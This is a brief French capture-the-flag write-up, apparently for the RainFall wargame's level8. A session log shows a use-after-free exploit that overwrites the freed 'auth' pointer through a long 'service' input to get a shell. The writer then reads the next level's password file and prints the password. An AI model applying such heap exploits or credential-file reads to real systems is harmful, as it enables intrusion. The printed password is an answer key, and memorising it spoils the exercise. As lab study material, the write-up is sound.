@@ -1,0 +1,36 @@
+Le binaire compare les inputs avec des mots qui sont associe a des actions
+
+auth
+
+reset (call a free)
+
+service
+
+login
+
+
+level8@RainFall:~$ ./level8
+(nil), (nil)
+auth test
+0x804a008, (nil)
+service AAAA
+0x804a008, 0x804a018
+login
+Password:
+0x804a008, 0x804a018
+reset
+0x804a008, 0x804a018
+
+On constate que le 'auth' pointeur pointe toujours sur sur la meme adresse memoire apres avoir ete free, On peut donc executer une attack dite "Use-After-Free"
+
+Essayons d'overwrite 'auth' grace au strdup present dans 'service'
+
+service 111111111111111111111111111111111111
+0x804a008, 0x804a028
+login
+$ cd ../level9 && cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+$
+
+
+Greetings @https://www.ayrx.me/protostar-walkthrough-heap //HEAP2
